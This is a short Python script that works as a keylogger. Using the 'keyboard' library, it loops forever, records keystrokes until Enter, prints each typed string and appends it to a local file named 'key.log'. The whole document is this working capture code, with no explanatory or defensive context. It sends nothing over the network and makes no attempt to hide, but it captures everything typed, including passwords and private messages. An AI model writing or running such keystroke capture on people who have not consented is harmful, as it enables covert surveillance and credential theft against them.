#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import keyboard as kb

def write_to_file(typed_strings):
    
    with open('key.log', 'a') as f:
        for s in typed_strings:
            if len(s) < 1:
                continue
            print("typed string: {}".format(s))
            f.write(s + '\n')


if __name__ == '__main__':
    while True:
        recorded_events = kb.record(until='enter')
        typed_strings = kb.get_typed_strings(recorded_events)
        write_to_file(typed_strings)

